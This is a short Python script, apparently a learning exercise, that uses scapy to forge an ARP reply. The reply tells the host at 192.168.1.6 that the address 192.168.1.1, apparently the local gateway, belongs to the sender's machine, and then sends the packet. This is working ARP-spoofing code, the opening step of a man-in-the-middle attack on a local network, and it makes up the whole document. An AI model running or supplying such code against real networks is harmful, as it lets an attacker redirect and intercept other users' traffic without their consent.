import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="192.168.1.6", hwdst="f0:2f:74:ae:b5:46", psrc="192.168.1.1")

# print(packet.show())
# print(packet.summary())
scapy.send(packet)

